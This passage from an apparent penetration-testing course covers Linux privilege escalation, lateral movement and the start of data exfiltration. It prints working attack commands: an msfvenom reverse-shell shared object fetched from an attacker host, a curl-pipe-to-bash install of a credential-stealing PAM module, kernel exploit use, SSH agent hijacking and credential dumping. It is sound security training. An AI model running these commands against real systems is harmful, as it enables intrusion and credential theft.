    We can see that John had no problem cracking the root password in the above example.

###### 4.1.5.2. MimiPenguin
If cracking the root or other users' password is out of the realm of possibility due to hash strength or password complexity, we can try and obtain the root password directly from the machines' memory using a tool known as [MimiPenguin](https://github.com/huntergregal/mimipenguin).

MimiPenguin works similarly to the well-known *mimikatz* for Windows, but is designed for Linux and attempts to dump cleartext credentials from memory from the following applications:
- GDM password (Kali Desktop, Debian Desktop)
- Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)
- VSFTPd (Active FTP Connections)
- Apache2 (Active HTTP Basic Auth Sessions)
- OpenSSH  (Active SSH Sessions - Sudo Usage)

There are 2 different scripts available, a shell script, and a python script, both have their pros and cons.
  Some features are supported in the python script, others not in the shell script, etc. We recommended trying both when assessing the target.
    |                      Feature                      |.sh|.py|
    |---------------------------------------------------|---|---|
    | GDM password (Kali Desktop, Debian Desktop)       | - | X |
    | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | X | X |
    | VSFTPd (Active FTP Connections)                   | X | X |
    | Apache2 (Active HTTP Basic Auth Sessions)         | - | X |
    | OpenSSH  (Active SSH Sessions - Sudo Usage)       | - | X |

    \*\*An "X" denotes full support while "-" denotes a features with known bugs.

Once we have uploaded and executed the MimiPenguin scripts on our target system, we can see that they were both successful at obtaining the root password, either from the Gnome Keyring or the Gnome Display Manager in this case.
  We can also see that regardless of password complexity, we can still obtain users' credentials with this tool.
    ```
    root@server2:~/mimipenguin$ ./mimipenguin.sh
    MimiPenguin Results:
    [SYSTEM - GNOME]
    root@server2:~/mimipenguin$ python mimpenguin.py
    MimiPenguin Results:      root:!ALs*$do0x%
    root@server2:~/mimipenguin$
    ```

#### 4.1.6. Pilfering Credentials From Swap Memory
Staying along the liens of directly dumping credentials from memory, we can also dump sensitive information from the swap file.
  As everything is a *file* in Linux, so is swap space, and we can use that to our advantage using built-in tools.

  Our caveat to this technique is that this has to be done as the root account, and may also be prone to false-positives as it is difficult to ascertain exactly where in swap memory sensitive information will be temporarily stored.

The partition or *file* defined as the swap file can be found with the following commands:
  ```
  swapon -s
  ```
  ```
  root@tester:~# swapon -s
  Filename        Type           Size    Used   Priority
  /dev/sda5       partition      2094076 0      -2
  ```
  In the output from the above command, we can see that our swap partition is at `/dev/sda5`

  We can obtain the exact same information by issuing the `cat` command to the `/proc/swaps` file:
  ```
  cat /proc/swaps
  ```
  ```
  root@tester:~# cat /proc/swaps
  Filename        Type           Size    Used   Priority
  /dev/sda5       partition      2094076 0      -2
  root@tester:~#
  ```

The process from here is very straightforward. We can use the `strings` command against `/dev/sda5` partition (in this case) while `grep`ing for string we are looking for. Examples:
  ```
  strings /dev/sda5 | grep "password="
  ```
  ```
  strings /dev/sda5 | grep "&password="
  ```

  A shell script `swap_digger.sh` has also been written which can automate searching for common sensitive strings within the swap file, and be downloaded [here](https://github.com/sevagas/swap_digger)

#### 4.1.7. Code Execution via Shared object Library Loading
Hijacking Dynamically Linked [Shared Object Libraries](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html) (`.so` files) is another method we can use to obtain elevated privileges to a Linux system under certain conditions.

  An example of this vulnerability can be found in [this bug report](https://www.mozilla.org/en-US/security/advisories/mfsa2013-87/) filed for Mozilla Firefox.

  Another example can be found at [this bug](https://bugzilla.mozilla.org/show_bug.cgi?id=1184466) that was also filed, but it relates more so to the GTK libraries.

Similar to Microsoft Windows' Dynamic-Link Library (DLL), Shared Object Libraries are essentially their equivalent on Linux systems, providing applications with functions that are called from outside of an application by referencing `.so` files at an applications' runtime.

There are 2 primary types of shared objects libraries we will encounter in our Linux travels, and they are:
- **Static Libraries** (`.a`) : Code that is compiled into an application
- **Dynamically Linked Shared Object Libraries** (`.so`) : These can either be *linked* to the application at runtime or unloaded and linked during an applications' execution

For purposes of this lesson, we will be focusing on the latter, the Shared Object Library.

We can find additional information about these types at the following [link](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)

When a Linux application is executed, one of the first things that happens under-the-hood, if it uses Shared Objects, is that it will search for those Shared Objects in the following search order:
1. Any directories specified by the `-rpath-link` options (`RPATH`)
2. Any directories specified by the `-rpath` options (`RPATH`)
3. If the `-rpath` and `-rpath-link` options are not used, it will then search the contents of the environment variables `LD_RUN_PATH` and `LB_LIBRARY_PATH`
4. Directories defined in the `DT_RUNPATH` environment variable first, if that doesn't exist, then the `DT_RPATH`
5. Then, the default lib directories, normally `/lib` and `/usr/lib`
6. Finally, any directories defined in the `/etc/ld.so.conf` file

[Reference](https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html)

Before we ho into further details, there are some things we need to determine before we continue:
1. Determine the shared objects that are being loaded by an executable
2. Determine if the application was compiled with `RPATH` or `RUNPATH` options. If yes, can we write into the locations specified by the either of those options?

  **Determine the Shared Object Libraries Being Loaded by an Executable**
  We can determine the shared object libraries that are being loaded by an executable with the `ldd` command. For example, if we want to see the shared objects being loaded by the `/usr/local/bin/program` executable, we run:
    ```
    ldd /usr/local/bin/program
    ```
    ```
    libpam_misc.so.0 => /lib/x86_64-linx-gnu/libpam_misc.so.0(0x00007fbbaa2171000)
    program.so => /usr/lib/program/program.so (0x00007b5bae08d0000)
    libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007f3ba1ef9000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5ca1b67000)
    ```

    In the example above, we can see that the `/usr/local/bin/program` executable is loading 8 different shared objects and all pointing to their physical locations.

  What we were looking for with the previous `ldd` output is to see if we can hijack any of the Shared Objects the executables is linking once we have determined if teh executable was compiled with `RPATH` or `RUNPATH` options.

  If we find that the executable was in fact compiled with `RPATH` or `RUNPATH` options, we will be able to drop our payload in the directories defined by either of those options.

  **Determine If The Executable Was Compiled With RPATH Options**
  For determining whether an executable was compiled with `RPATH` or `RUNPATH` options, we can use the `objdump` command:
    ```
    objdump -x /usr/local/bin/program | grep PATH
    ```
      and
    ```
    objdump -x /usr/local/bin/program | grep RUNPATH
    ```

    If the executable in question as compiled with the `RPATH` or `RUNPATH` options, the `objdump` output will be similar to the below:
      ```
      RPATH /tmp/program/files
      ```
        or
      ```
      RUNPATH /tmp/program/files
      ```

  In the examples on the previous slide, and having determined that the `program` executable was compiled with `RPATH` options pointing to `/tmp/program/libs`, and we also know that `RPATH` is checked for linked Shared Objects before the `/lib` or `/usr/lib` directories, we can place our malicious `.so` file in the `/tmp/program/libs` directories, and it should be executed whenever the executable is launched.

To summarize our steps so far:
1. We have found an interesting executable on the system that is linking to shared libraries
2. We have also determined that the executable was compiled with `RPATH` or `RUNPATH` options (using `objdump`) pointing to the `/tmp/program/libs` directory, which will search for Shared Objects prior to any other locations (i.e. `/lib`, `/usr/lib`) are searched.

Once the above conditions are met, we can move onto creating a malicious `.so` file.

Let's look at our previous `ldd` output of the `program` executable:
  ```
  ldd /usr/local/bin/program
  ```
  ```
  libpam_misc.so.0 => /lib/x86_64-linx-gnu/libpam_misc.so.0(0x00007fbbaa2171000)
  program.so => /usr/lib/program/program.so (0x00007b5bae08d0000)
  libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007f3ba1ef9000)
  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5ca1b67000)
  ```

Since we have determined that `program` will load shared objects from `/tmp/program/libs` directory defined with the `RPATH` option (as we saw with `objdump`) and it will load them before it loads anything in `/lib` or `/usr/lib`

Technically, we could pick any of the above and create a shared object with a similar name of any of them.

However, we will go with the `program.so` object for the name of our malicious shared object file for this example.

###### Steps:
###### 1. Generate Backdoored Shared Object
  We can create our backdoored `program.so` shared object with [msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom), similar to the command below:
    ```
    msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<attacker_LPORT> -f elf-so -o program.so
    ```

    With the above msfvenom command, we are creating a `.so` (`program.so`), which is the name of one of the shared objects we know the `program` at runtime, and using a stageless *shell_reverse_tcp* payload pointing to our attacker machine and port, where we will also setup a listener with the same payload.

###### 2. Transfer Backdoored Object to the Target Machine
  The `program.so` file will then need to be transferred to the target machine to the directory that was defined by the `RPATH` option (`/tmp/program/libs`).

  On your attacker system, in the directory that contains the backdoored `program.so` file, we can use Python to spin-up a quick http server on port 80:
    On attacker system:
    ```
    python -m SimpleHTTPServer 80
    ```

  Once that is complete, we can, from the target systems' `/tmp/program/libs` directory, use `wget` to download the `program.so` file from the target:
    On target system:
    ```
    cd /tmp/program/libs && wget http://attacker_ip/program.so
    ```

###### 3. Start Listener on Attacker Machine, and Execute Program
  Once we have downloaded our backdoored `program.so` to the target, we will configure a Metasploit listener with the same payload, and run it.
    ```
    msf > use exploit/multi/handler
    msf exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
    msf exploit(multi/handler) > set LHOST <attacker_ip>
    msf exploit(multi/handler) > set LPORT <attacker_lport>
    msf exploit(multi/handler) > exploit -j
      [*] Exploit running as background job 0.
      [*] Started reverse TCP handler on <attackker_ip>:<attacker_lport>
    ```

An important point to note is that in order for us to elevate our privileges with this vulnerability, it is required that the shared object via executing program, be executed by a user with higher privileges, or scheduled as part of a cron job that runs as root.

We have several options.
  We either wait for the program to be launched with elevated privileges, at which point a reverse shell would be initiated back to our attacker machine under the context of that users' privileges (hopefully root)

  Or, in an ideal scenario, if we are lucky, the interesting program we found already be configured as a service, or to be run from a cron as root. At which point, we simply wait for the corn job to run.

  We could also use social engineering to try and persuade an end-user to execute the program.

This reinforces the importance of comprehensive information gathering and enumeration in regard to the search for root-owned services and root-owned cron jobs that a low privileges user (us) could modify.

Alternatively, if we are already root on the system, we can use this method as a stealthy persistence mechanism.

#### 4.1.8. Introduction to Kernel Exploits
Kernel Exploits are one of the most prolific methods for elevating privileges on Linux machines with outdated Kernels. New vulnerabilities are discovered, and exploits are developed on practically a monthly-basis for varying distributions and architectures.

Some recent examples of privilege escalation vulnerabilities and associated exploits affecting the Linux kernel include:
- [Dirty Cow - Existed in Kernel versions since 2.6.22 (2007) and fixed in 2016][https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails]
- [Stack Clash (Multiple Distributions/Kernels)][https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash]
- [DCCP Double-Free Privilege Escalation (4.4.0 kernel/Ubuntu)][https://www.exploit-db.com/exploits/41458/]
- [Race Condition Privilege Escalation (Linux Kernel < 4.10.15)][https://www.exploit-db.com/exploits/43345/]

The [kernel](https://en.wikipedia.org/wiki/Linux_kernel) is the core of the Linux OS.

It was initially conceived and created by Linus Trovalds in 1991 and has since grown to support dozens of computing architectures including routers, servers, and workstations, firewalls, and even mobile devices such as Android.

Being open source and with thousands of contributors and users worldwide, it makes the kernel a high-value target for Zero-Days or otherwise more popular and known attack vectors.

There are many different categories of kernel exploits, some of the most common are:
- [Buffer Overflows](https://en.wikipedia.org/wiki/Buffer_overflow)
- [Memory Corruption](https://en.wikipedia.org/wiki/Memory_corruption)
- [Denial-Of-Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)
- [Race Conditions](https://en.wikipedia.org/wiki/Race_condition)

When not in the "Denial-of-Service" category, they most of the time allow [arbitrary code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution) and privilege execution.
  A quick search on **credetials.com** shows us a sampling of some of the higher-rated vulnerabilities affecting the Linux Kernel with a CVSS score of 10. (see img-141)

Linux kernel exploits for our purposes twill typically either be pre-compiled ELF binaries, C source code (.c files) which we will compile ourselves, or available via exploit frameworks such as Metasploit.

###### A Word of Caution Exploit Code
  As with any other file you would download from the internet from an unknown source, just blindly compiling or executing exploits of which we don't understand their inner workings could result in your system being compromised, and could also result in any systems you are testing to be compromised by unknown actors as well.

  Always take precaution when compiling and executing exploit code. Go the extra mile and try to understand what the exploit is actually doing behind-the-scenes.

  This is particularly true of shellcode in exploits as the shellcode could be doing somethings malicious, whether it is opening up a bind shell on your system, initiation a reverse shell to an attackers' system, or sometimes, deleting your entire OS (`rm -rf /*`)

  For the most part, exploits originating from most frameworks, i.e., Metasploit, are generally OK since many eyes review them, but take some extra caution with other exploit sources.

###### Finding the Right Kernel Exploit
  There are several tools available to us that we can use for searching for exploits.
  One of those tools is [searchsploits](https://www.exploit-db.com/searchsploit/) and is pre-installed on Kali Linux. With searchsploit, we simply run the searchsploit command followed by a search term.

  In the below example, we are looking for kernel exploits related to the Debian distribution:
    ```
    searchsploit "linux kernel debian"
    ```
    ```
    root@tester:~# searchsploit "linux kernel debian"
    ----------------------------------------- ------------------------------------
     Exploit Title                           |  Path
                                             | (/usr/share/exploit/db)
    ----------------------------------------- ------------------------------------
    Linux Kernel (Debian 7.7/8.5/9.0 / ...)  | exploits/linux_x86-64/local/42275.c
    Linux Kernel (Debian 7/8/9/10    / ...)  | exploits/linux_x86/local/42274.c
    Linux Kernel (Debian 9/10        / ...)  | exploits/linux_x86/local/42276.c
    Linux Kernel 2.0.x (Debian 2.1   / ...)  | exploits/linux/dos/196575.c
    ...

    ```

  Another excellent tool written in Perl is *linux_exploit_suggester*, and can be downloaded at the following [link](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
    With *linux_exploit_suggester*, we can run it locally on our attacker system while specifying the kernel version of our target with the `-k` switch:
      ```
      root@tester:~# perl Linux_Exploit_Suggester.pl -k 2.6.38

      Kernel local: 2.6.38

      Search among 65 exploits...

      Possible Exploits:
      [+] msr
         CVE-2013-0268
         Source: http://www.exploit-db.com/exploits/27297/
      [+] rawnodePTY
         CVE-2014-0196
         Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
      [+] semtex
         CVE-2013-2094
         Source: http://www.exploit-db.com/download/2544
      ```

    We can also run it directly on the target system.

    If we run it without supplying the `-k` option, it simply executes a `uname -a` command and will determine the appropriate kernel version on the target system, as can be seen in the example:
      ```
      root@server3:/tmp# perl Linux_Exploit_Suggester.pl

      Kernel local: 2.6.24

      Searching among 65 exploits...

      Possible Exploits:
      [*] american-sign-language
         CVE-2010-4347
         Source: http://www.securityfocus.com/bid/45408/
      [*] can_bem
         CVE-2010-2959
         Source: http://www.exploit-db.com/exploits/14814
      ...
      ```

  Once we have determined several kernel exploits that are valid for our targets' kernel version, we can move onto downloading the source code to the target.

  Keep in mind that not all exploits will be *click-and-shoot*

  Many require parameters that we will need to supply to the exploit command line in order to get them working.
    An example of this is the [UDEV < 1.4.1 - Local Privilege Escalation](https://www.exploit-db.com/exploits/8572/) exploit which affects the 2.6 kernel, and requires that we determine the PID of the udevd netlink socket, and also requires that we create file `/tmp/run` which contains whatever code we'd like to be executed as root.

    A demonstration is available in the Videos portion of this module and will detail how to obtain root privileges on an affected kernel.

###### Compiling Exploit Code
  Once we have kernel exploit code downloaded to our target system, we can compile it.

  One of the requirements, of course, is that [GNU C/C++ Compiler](https://gcc.gnu.org/) is installed on the target.

  We can determine this by simply running `gcc --version` on the target system.
    If `gcc` is installed, you will see output similar to the below.
      ```
      root@server3:/tmp# gcc --version
      gcc (GCC) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
      Copyright (C) 2007 Free Software Foundation, Inc.
      This is free software: see the source for copying conditions.
      ```

  Compiling an exploit can sometimes be as simple as running the following command:
    ```
    gcc exploit.c -o exploit
    ```
    and (make it executable)
    ```
    chmod +x exploit
    ```
    We then run our exploit:
    ```
    ./exploit
    ```

  Sometimes, more complex compile options are required for our exploit.
    In that case, often times the exploit code itself will include some help instructions within its commented section, the command line we can use to compile the exploit.

    It will also include usage details about the exploit as can be seen in the source code of the **sys_chown missing DAC controls on Linux (CVE-2004-0497)** exploit affecting kernels 2.x kernels (see img-153)

  Other times, we will find ourselves in a situation where our target is of a 32bit architecture and doesn't have `gcc` installed, and we need to compile the exploit on our 64bit attacker machine.
    The resulting 32bit binary would then be transferred to our target system.

    We can do this by specifying the `-m32` flag to `gcc`, as seen with the following command:
      ```
      gcc -m32 exploit.c -o exploit
      ```

###### Metasploit Kernel Exploits
  Let's not forget about Metasploit. Metasploit contains plenty of kernel exploit modules we can use if we find our target is vulnerable.
    To find exploit modules
    ```
    msf > use exploit/linux/local
    ```

  Let's take the `udev_netlink` exploit for instance.
    In this example, we have executed a `shell_reverse_tcp` payload on our target system as low privileged user `todd` and have an active shell:
      ```
      msf exploit(multi/handler) > [*] Command shell session 4 opened (192.168.13.62:5555 -> 192.168.13.53:57652)

      msf exploit(multi/handler) > sessions -i 4
      [*] Starting interaction with 4...

      id
      uid=1001(todd) gid=1001(user) groups=1001(user)
      ```

    We will load the *udev_netlink* exploit, configure our active `SESSION` value, and run the exploit:
      ```
      msf > use exploit/linux/local/udev_netlink
      msf exploit(linux/local/udev_netlink) > set SESSION 4
      SESSION => 4
      msf exploit(linux/local/udev_netlink) > exploit
      [*] Started reverse TCP handler on 192.168.13.62:4444
      ...
      [*] Meterpreter session 5 opened (192.168.13.62:4444 -> 192.168.13.53:48237)
      meterpreter > shell
      Process 16518 created.
      Channel 1 created.

      id
      uid=0(root) gid=0(root)
      whoami
      root
      uname -a
      Linux server3 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
      ```

###### Kernelpop
  In addition to Metasploit, searchsploit (exploit-db), and other sources, there is a relatively new exploit framework designed for Linux and Max targets known as [Kernelpop](https://github.com/spencerdodd/kernelpop)

  We encourage you to experiment with this tool as well.

  It requires Python3, and currently supports exploitation for 23 CVEs, all affecting various architectures and Linux distributions.
  Kernelpop can be downloaded from the following Github links:
  - https://github.com/spencerdodd/kernelpop
  - https://github.com/SecWiki/linux-kernel-exploits
  - http://exploit-db.com/
  - https://github.com/lucyoa/kernel-exploits

#### 4.1.9. Introduction to Unix Socket Exploitation
  A Unix socket is another component in \*nix systems that you can leverage to escalate your privileges.

  To safely use a Unix socket, the appropriate security measures/permissions must be implemented beforehand.

  As you can imagine, this is not always the case.

  The easiest to follow example on how to leverage an insufficiently secured Unix socket is Docker.
    [By design](https://docs.docker.com/install/linux/linux-postinstall/), the docker daemon binds to a Unix socket instead of a TCP port.

    By default, that Unix socket is owned by the user root; additionally, the docker daemon always run as the root user.

  Suppose you landed on a machine and the current user is an unprivileged user, that happens to have access to the docker command (he is part of docker group).
  Also, suppose that the [docker Unix socket](https://medium.com/lucjuggery/about-var-run-docker-sock-3bfd276e12fd) is not protected by implementing the appropriate permissions.

  Let's see how we could escalate our privileges in that machine.
    Specifically, let's try to access `/etc/shadow`:
      ```
      # docker run -v /etc/shadow/hashedpasswords -s postgres
      # docker etc -ti {CONTAINER_ID} bash
      # root@XXXXXXXXXXX:/# cat /docker/hashedpasswords > /docker/test.txt
      # root@XXXXXXXXXXX:/# chmod 777 /docker/test.txt
      # root@XXXXXXXXXXX:/# cat /docker/test.txt
      ```
    The result as you can see (see img-164), you can see the content of `/etc/shadow`

  Two more interesting examples on leveraging Unix sockets for privilege escalation are the following:
  1. https://www.exploit-db.com/exploits/40962/
  2. https://github.com/rapid7/metasploit-framework/pull/9408/files

  Tools:
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
  - [Unix-Privesc-Check](https://github.com/pentestmonkey/unix-privesc-check)
  - [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
  - [Searchsploit](https://www.exploit-db.com/searchsploit/)
  - [Kernelpop](https://github.com/spencerdodd/kernelpop)
  - [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  - [Linux Post-Exploitation Command List](https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List)

___________________________________
## 4.2. Lateral Movement
An important element of the Penetration Testing engagement once we have established our initial foothold on one or more systems includes the process of Lateral Movement.

Lateral Movement involves moving throughout the target organization from machine to machine, server to server using credentials we obtain through other phases, and further strengthening our foothold within the target infrastructure to the ultimate objective which is defined by the customer.

As an example, which should clarify this concept, we can envision a scenario where the customer has included Social Engineering as part of an engagement and an email phishing scenario has been scoped into the project.

  We develop our ruse, send off some emails and end up successfully "hooking" Mark from the Sales Department and now have a shell (as Mark) phoning home to our listener, or Command and Control infrastructure.

    We find that Mark, is a non-admin, low-privileged user, with access to a set of predefined network shares.

    The customer has also incorporated several hardening controls that deny us the ability to dump his credentials from memory or use other methods to get Mark's credentials.

    After conducting some enumeration on his machine, we discover that Mark also has special access to an administrative interface of a system developed to store important information regarding customers, sales proposals, etc.

    We discover this by dumping his browsers' bookmarks t o a file which we then examine on our attacker machine.

    Figuring that Mark logs into this application from time to time, we configure sniffer on his machine, and after some time, we intercept cleartext HTTP credentials to this administrative sales site.

    That is step one.

  We are now moving from Mark's machine to the server hosting the sales admin software.
    We log into the Sales admin site as Mark.

    Once we are logged in, we notice an area of the application that contains a list of all users that are configured for that sales admin site.

    We attempt to create our own user, but quickly realize that Mark isn't an admin, and he doesn't have a list of some valid usernames for the organization.
    We save those in our file.

    We also notice that the sales admin user page contains starred out (`***`) password fields which we are unable to modify. That option is disabled as Mark is not an admin of the sales admin site.

    We do realize, however, while viewing the source code of the site that the credentials for all the users are actually stored in cleartext within the source code of the application!
    We find that this is actually a known vulnerability that affect this particular version of the sales admin site.

  We now have the credentials for a user "Elizabeth" of that sales admin system, who we know, from our reconnaissance phase, is an administrator of server belonging to yet another department.

    We quickly (but stealthily) configure a brute force tool to use Elizabeth's username we discovered from the application, along with just her password.
    We user her valid credentials from the sales admin site to conduct a password spray attack against a selected set of in-scope IP addresses.

    One username. One password. Several systems.

    Our password spray attack reveals that we were able to log onto 23 machines via SSH, across the infrastructure using Elizabeth's credentials. A password-reuse pitfall.

  We have gone from Mark in Sales, to an internal Sales Admin site as Mark, to 23 machines as yet another user (Elizabeth), whom we quickly uncover is a superuser on several Linux machines, and that is just the beginning.

  This is lateral movement in a nutshell.

Now that we have an idea of what lateral movement is, let's move on to some techniques we can use to move laterally within an infrastructure once we have gotten access to a Linux machine.

#### 4.2.1. SSH Hijacking
SSH Session Hijacking is one of the methods we can explore for lateral movement which is gaining some attention recently.

The [Mitre ATT&CK Framework](https://attack.mitre.org/wiki/Main_Page) recently added it to its list of techniques for lateral movement: https://attack.mitre.org/wiki/Technique/T1184

In order for this method to be successful, the compromised machine should have an active SSH session established to another machine via [Public Key Authentication](https://www.ssh.com/ssh/public-key-authentication)

If we are root on the compromised system, it is then possible to either compromise the SSH agent or access the SSH agent's [unix domain socket](https://en.wikipedia.org/wiki/Unix_domain_socket) and hijack the connection.

The reason this is possible is that the `ssh-agent` creates a [unix domain socket](https://en.wikipedia.org/wiki/Unix_domain_socket), and listens for connections from the `sshd` daemon to this socket.

The protection of the socket relies on simple unix permissions, which ultimately means that any authentication keys that are used with that socket can be retrieved by any user who can connect to the socket itself.

[Reference](https://www.symantec.com/connect/articles/ssh-and-ssh-agent)

An example of the steps needed to execute this attack are as follows:
1. We first determine the SSH process ID of the user on the compromised host
    ```
    ps aux | grep sshd
    ```
2. Next, we determine the SSH_AUTH_SOCK environment variable for the sshd PID
    ```
    grep SSH_AUTH_SOCK /proc/<PID>/environ
    ```
3. We then hijack the targets ssh-agent socket
    ```
    SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXX/agent.XXXX ssh-add -l
    ```
4. Finally, we log into the remote system our victim is logged into as the target.
    ```
    ssh remotesystem -l victim
    ```

Please refer to the following [link][https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/] for additional information regarding research related to this method

#### 4.2.2. Stealing SSH Credentials
Suppose you successfully compromised a remote machine, which currently operating as root, and you would like to collect as many credentials as possible in order to move laterally leveraging credential reuse cases.

What you can do is steal SSH credentials through a [malicious PAM module](https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==).

Through this malicious PAM module, every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used for this connection attempt.

Let's see this technique in action:
  On your attacking machine:
    ```
    git clone https://github.com/mthbernardes/sshLooter.git
    cd sshLooter
    ```
  On the compromised machine:
    ```
    curl http://yourserverip:8000/install.sh | bash
    ```
  The below similar to what you will see in your server:
    ```
    Body:
    {"text": "Connection from host 192.168.2.7 using the user root and password P3n31337@ELS!", "chat_id":"USER-ID"}
    ```

You can now try the captured credentials against other identified machines in the network!

#### 4.2.3. Samba Secrets to Domain Admin
One interesting method we can use to move from one Linux machine to another systems in an organization involves dumping machine accounts passwords stored on a Samba server that we discover has a trust relationship with an Active Directory infrastructure.

When a new Samba user is created, this information is usually stored in what is known as the `secrets.tdb` file.
  In Samba version 4.7.4 on Debian, the `secrets.tdb` file is stored in the `/var/lib/samba/private` directory

Assuming we are root on the machine, we can use the `tdbdump` command to dump the information in the `secrets.tdb` file with the following command:
  ```
  tdbdump /var/lib/samba/private/secrets.tdb
  ```
  The output of which would be something similar to the following:
    ```
    {
    key(20) = "SECRETS/MACHINE_SEC_CHANNEL_TYPE/DEV"  
    data(4) = "\02\00\00\00"
    }
    {
    key(19) = "SECRETS/SALTING_PRINCIPAL/DES/DEV.FOOCORP.COM"  
    data(68) = "host/samba.dev.foocorp.com@DEV.FOOCORP.COM\00"
    }
    {
    key(20) = "SECRETS/MACHINE_PASSWORD/DEV"  
    data(4) = "\67\9E\AB\F8\D4\......"  
    }

    ```

    In the output, we can see that the machine is a member of the `foocorp.com` domain, and can also see that one of the data fields contains encoded data that decodes to the NTLM hash of the computer of this machine, which we will see in the next slides.

Now assuming the Samba server has a valid trust relationship with an Active Directory domain ,we can decode the results on `tdbdump` UTF8 encoded `data` fields to obtain the NTLM hash for the Samba computer account and ultimately pass-the-hash to Active Directory using `pth-cmbclient` from the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)

  This method is described in great detail at the following link which shows us how we can move from the Samba server to Active Directory as a computer account, to ultimately obtaining Domain Admin-level privileges: https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

  `pth-toolkit` can also be downloaded from the following github page if you'd like to experiment on a test lab: https://github.com/byt3bl33d3r/pth-toolkit


#### 4.2.4. VPN Pivot
We'd like to briefly mention another tool that you can try in a test environment is known as "VPNPivot"

VPNPivot creates a VPN tunnel between the attacker and compromised Linux host, and allows pivoting to other hosts internally within an organization that may be behind firewalls, NAT configurations, etc.

Once [downloaded][https://github.com/0x36/VPNPivot], we can complete it and install it with several commands on our attacker machine:
  ```
  root@tester:~/VPNPivot# ./autogen.sh
  root@tester:~/VPNPivot# ./configure
  root@tester:~/VPNPivot# make && make install
  ```

#### 4.2.5. Dumpign stored Firefox credentials
As we saw in the introduction to this section with the example Lateral Movement scenario, the testers dumped the stored bookmarks from users' browser in order to move from the users' endpoint to the Sales admin site.

In addition to using saved bookmarks to determine sites a user visits, there is another technique we can use to dump the credentials that a Linux user has stored in their Firefox browser for sites they frequently access.

If you have used Firefox, then you are probably familiar with the "remember login" notification (see img-201)

  More times than not, users will opt for their browser to remember their passwords for sites because it is easier and convenient.

  The good news for us as Penetration Testers is that these stored username/password combination can be **decrypted**.

Firefox, when launched for the first time, creates a default profile for the user.

This profile can be found in `/home/user/.mozilla/firefox` and is a folder which is created with a random alphanumeric value and a `.default` string appended, similar as can be seen in the following image:
  ```
  root@tester:~/.mozilla/firefox# ls
   8msaug56.default 'Crash Reports'     profiles.ini
  root@tester:~/.mozilla/firefox#
  ```

The saved browser passwords are stored in the randomly named profile folder, in a file called `logins.json`, and can be dumped using a tool known as `firefox_decrypt.py`, a python script which can be downloaded from [here][https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py]

The python script can be transferred or copied onto the target system and then run with a simple command:
  ```
  python firefox_decrypt.py
  ```

Once run, it will list any profiles currently configured in Firefox for the currently logged on user, and also ask which one we'd like to user in addition to asking for the Master Password.
**This tool will only work if the Master Password has not been set.**
Assuming that is the case, we can just hit enter to dump the stored credentials.
    ```
    Master Password for profile /root/.mozilla/firefox/8msaug56.default:
    WARNING - Attempting decryption with no Master Password

    Website:  http://192.168.13.53:8180
    Username: 'admin'
    Password: 'TotallySecurePassw0rd!#123'
    ```

This is a great and quick technique we can use to get credentials to other areas of the network.

There are plenty of other techniques we can use for our Lateral Movement purposes, which can be found in the Video section accompanying this lesson.

___________________________________
## 4.3. Data Exfiltration
Depending on the defined scope of an engagement, some customers will want to include the simulation of an Advanced Persistent Threat (APT).

Many times,  they will request that activities involving creating backdoors, persistence methods, and data exfiltration be used in order to more realistically emulate a real-world attack and to furthermore test any protective measures that have been implemented on Workstations, Servers, Endpoints, and Egress perimeter controls.

The two sections that follow will cover some methods we can use to exfiltrate data and maintain access to systems using both known methods, in addition to custom methods developed specifically for this course.

Once we have been to obtain sensitive information or reach the objectives of the customer requirements, our goal with data exfiltration is to attempt to "move" the data we have acquired securely outside of the organization infrastructure to our attacker-controlled systems.

  Or, in some cases, simply to another attacker-controlled machine within the customer network.

  This is typically done in order to test controls a customer has put in place that would detect things like Payment Controller Information ([PCI][https://www.websense.com/content/support/library/data/v84/policy_classifier/PCI-Discovery.aspx]) and other Personally Identifiable Information ([PII][https://en.wikipedia.org/wiki/Personally_identifiable_information] leaving the infrastructure perimeter or moving across the wire.

There are several ways we can accomplish the moving of that information from one system to our attacker-controlled systems.

In the following slides, we will cover several examples of ways we can do this while making sure not to transfer anything in cleartext.

#### 4.3.1. Exfiltration over TCP Socket with EBCDIC and Base64
One of those methods involves creating a local TCP socket on the target system which points to our attacker machine while, on our attacker machine, we configure a netcat listener to receive the data.

